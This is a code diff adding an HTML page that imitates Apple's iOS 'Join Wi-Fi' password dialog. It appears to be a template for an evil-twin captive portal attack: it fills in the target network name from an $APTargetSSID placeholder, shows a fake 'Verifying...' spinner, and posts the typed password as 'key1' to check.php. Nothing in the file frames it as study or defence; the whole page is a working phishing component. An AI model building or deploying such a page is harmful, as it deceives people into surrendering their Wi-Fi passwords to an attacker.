@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>Join Wi-Fi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(180deg, #e8e8ed 0%, #d2d2d7 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 60px;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .modal-overlay {
+            width: 100%;
+            max-width: 400px;
+            padding: 0 20px;
+        }
+
+        .modal {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+        }
+
+        .btn-close, .btn-submit {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-close {
+            background: rgba(0, 0, 0, 0.06);
+        }
+
+        .btn-close:hover {
+            background: rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-close svg {
+            width: 12px;
+            height: 12px;
+            stroke: #3c3c43;
+            stroke-width: 2.5;
+        }
+
+        .btn-submit {
+            background: rgba(0, 0, 0, 0.06);
+            opacity: 0.4;
+            pointer-events: none;
+        }
+
+        .btn-submit.active {
+            opacity: 1;
+            pointer-events: auto;
+            background: rgba(0, 0, 0, 0.06);
+        }
+
+        .btn-submit svg {
+            width: 14px;
+            height: 14px;
+            stroke: #8e8e93;
+            stroke-width: 2.5;
+            fill: none;
+        }
+
+        .btn-submit.active svg {
+            stroke: #007aff;
+        }
+
+        .modal-body {
+            padding: 20px 24px 32px;
+            text-align: center;
+        }
+
+        .wifi-icon {
+            margin-bottom: 24px;
+        }
+
+        .wifi-icon svg {
+            width: 80px;
+            height: 60px;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+            letter-spacing: -0.4px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #6e6e73;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        .input-container {
+            background: #fff;
+            border-radius: 10px;
+            padding: 0;
+            margin-bottom: 16px;
+            overflow: hidden;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: none;
+            font-size: 17px;
+            font-family: inherit;
+            background: transparent;
+            color: #000;
+            outline: none;
+        }
+
+        .password-input::placeholder {
+            color: #c7c7cc;
+        }
+
+        .password-input:focus {
+            outline: none;
+        }
+
+        .hint-text {
+            font-size: 12px;
+            color: #8e8e93;
+            line-height: 1.5;
+            padding: 0 8px;
+            text-align: left;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.9);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e5e5ea;
+            border-top-color: #007aff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .loading-text {
+            margin-top: 16px;
+            color: #8e8e93;
+            font-size: 14px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Network name injection */
+        .network-name {
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <button class="btn-close" type="button" onclick="window.location.reload()" title="Close" aria-label="Close">
+                    <svg viewBox="0 0 14 14" fill="none" aria-hidden="true">
+                        <path d="M1 1L13 13M1 13L13 1" stroke-linecap="round"/>
+                    </svg>
+                </button>
+                <button class="btn-submit" type="button" id="submitBtn" onclick="submitForm()" title="Submit" aria-label="Submit">
+                    <svg viewBox="0 0 14 14" aria-hidden="true">
+                        <path d="M2 7L5.5 10.5L12 3.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </button>
+            </div>
+            <div class="modal-body">
+                <div class="wifi-icon">
+                    <svg viewBox="0 0 80 60" fill="none">
+                        <path d="M40 52C43.3137 52 46 49.3137 46 46C46 42.6863 43.3137 40 40 40C36.6863 40 34 42.6863 34 46C34 49.3137 36.6863 52 40 52Z" fill="#007AFF"/>
+                        <path d="M26 36C30.5 31.5 35 29 40 29C45 29 49.5 31.5 54 36" stroke="#007AFF" stroke-width="5" stroke-linecap="round"/>
+                        <path d="M16 26C23 19 31 15 40 15C49 15 57 19 64 26" stroke="#007AFF" stroke-width="5" stroke-linecap="round"/>
+                        <path d="M6 16C16 6 27 1 40 1C53 1 64 6 74 16" stroke="#007AFF" stroke-width="5" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <h1 class="title">Join "<span class="network-name" id="networkName">$APTargetSSID</span>"</h1>
+                <p class="subtitle">Enter the password to join this Wi-Fi network.</p>
+                <form id="wifiForm" method="POST" action="check.php">
+                    <div class="input-container">
+                        <input type="password" 
+                               class="password-input" 
+                               name="key1" 
+                               id="passwordInput" 
+                               placeholder="Password" 
+                               autocomplete="off"
+                               autocorrect="off"
+                               spellcheck="false"
+                               oninput="checkPassword()">
+                    </div>
+                </form>
+                <p class="hint-text">You can also access this Wi-Fi network by bringing your iPhone near any iPhone, iPad, or Mac which has connected to this network and has you in their contacts.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p class="loading-text">Verifying...</p>
+    </div>
+
+    <script>
+        const passwordInput = document.getElementById('passwordInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        function checkPassword() {
+            const value = passwordInput.value;
+            if (value.length >= 8) {
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.classList.remove('active');
+            }
+        }
+
+        function submitForm() {
+            if (passwordInput.value.length >= 8) {
+                loadingOverlay.classList.add('show');
+                setTimeout(function() {
+                    document.getElementById('wifiForm').submit();
+                }, 1500);
+            }
+        }
+
+        // Submit on Enter key
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && passwordInput.value.length >= 8) {
+                e.preventDefault();
+                submitForm();
+            }
+        });
+
+        // Focus input on load
+        window.onload = function() {
+            passwordInput.focus();
+        };
+    </script>
+</body>
+</html>
